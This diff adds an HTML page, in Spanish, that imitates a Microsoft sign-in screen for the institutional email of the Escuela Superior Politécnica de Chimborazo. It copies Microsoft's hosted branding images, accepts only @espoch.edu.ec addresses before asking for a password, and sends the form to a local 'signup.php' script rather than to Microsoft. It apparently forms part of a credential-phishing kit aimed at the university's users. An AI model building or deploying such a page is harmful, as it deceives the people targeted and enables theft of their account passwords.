@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Iniciar sesión en la cuenta</title>
+    <link id="tenantFavicon" rel="shortcut icon" href="https://aadcdn.msauthimages.net/dbd5a2dd-blbs-qanefnrvhd-v9-1edou211ilhc2zwg9v2epxnk/logintenantbranding/0/favicon?ts=638453591817089732">    <style>
+        #error-message {
+            color: red;
+            display: none;
+            margin-bottom: 5px;
+            font-size: 0.875rem;
+        }
+        .form-group {
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <form action="signup.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
+            <img id="bannerLogo" data-bind="addEventHandlers, attr: { src: bannerLogoUrl, alt: str['STR_Banner_Logo_AltText'] }, externalCss: { 'banner-logo': true }" src="https://aadcdn.msauthimages.net/dbd5a2dd-blbs-qanefnrvhd-v9-1edou211ilhc2zwg9v2epxnk/logintenantbranding/0/bannerlogo?ts=637631059275592698" alt="Logotipo del banner de la organización" class="banner-logo ext-banner-logo">
+            <div class="forms-container">
+                <div class="forms">
+                    <div class="first">
+                        <h2>Iniciar sesión</h2>
+                        <div class="form-group">
+                            <p id="error-message">Escriba una dirección de correo electrónico, un número de teléfono o un nombre Skype válidos.</p>
+                            <input type="email" id="emailInput" placeholder="Correo electrónico, teléfono o Skype" required>
+                        </div>
+                        <p><a href="#">¿No puede acceder a la cuenta?</a></p>
+                        <button type="button" class="next-btn">Siguiente</button>
+                        <div id="idBoilerPlateText" class="wrap-content boilerplate-text ext-boilerplate-text" style="margin-top: 20px;">
+                            <p>Correo institucional de la Escuela Superior Politécnica de Chimborazo - DTIC</p>
+                        </div>
+                    </div>
+                    
+                    <div class="second">
+                        <p><span class="arrow-btn">&#8592;</span> <span class="email">helloworld@hotmail.com</span></p>
+                        <h2>Escribir contraseña</h2>
+                        <div class="form-group">
+                            <input type="password" id="passwordInput" placeholder="Contraseña" required>
+                        </div>
+                        <a href="https://passwordreset.microsoftonline.com">He olvidado mi contraseña</a>
+                        <button type="button" class="sign-in-btn">Iniciar sesión</button>
+                    </div>
+                </div>
+            </div>
+        </form>
+        <div class="bottom">
+            <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg">
+            <span>Opciones de inicio de sesión</span>
+        </div>
+    </div>
+
+    <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links">
+        <a id="moreOptions" href="#">...</a>
+    </div>
+
+    <script>
+        const forms = document.querySelector('.forms');
+        const nextButton = document.querySelector('.next-btn');
+        const arrowButton = document.querySelector('.arrow-btn');
+        const emailInput = document.querySelector('#emailInput');
+        const emailDisplay = document.querySelector('.email');
+        const passwordInput = document.querySelector('#passwordInput');
+        const errorMessage = document.querySelector('#error-message');
+
+        nextButton.addEventListener('click', () => {
+            const emailValue = emailInput.value;
+
+            if (!emailValue.endsWith('@espoch.edu.ec')) {
+                errorMessage.style.display = 'block'; // Muestra el mensaje de error de correo
+                return; // Detiene el proceso si el correo no es válido
+            } else {
+                errorMessage.style.display = 'none'; // Oculta el mensaje de error de correo
+            }
+
+            // Si el correo es válido, avanza al siguiente paso
+            forms.classList.add('next-form');
+            emailDisplay.innerText = emailValue;
+            passwordInput.setAttribute('placeholder', 'Contraseña');
+            document.querySelector('.bottom').style.display = 'none';
+        });
+
+        arrowButton.addEventListener('click', () => {
+            forms.classList.remove('next-form');
+            document.querySelector('.bottom').style.display = 'flex';
+        });
+
+        // Agregar evento "Enter" para avanzar de correo a contraseña
+        emailInput.addEventListener('keydown', (event) => {
+            if (event.key === 'Enter') {
+                nextButton.click(); // Simula el clic en el botón "Siguiente"
+            }
+        });
+
+        // Agregar evento "Enter" para avanzar de contraseña a la siguiente acción
+        passwordInput.addEventListener('keydown', (event) => {
+            if (event.key === 'Enter') {
+                document.querySelector('.sign-in-btn').click(); // Simula el clic en "Iniciar sesión"
+            }
+        });
+    </script>
+</body>
+</html>
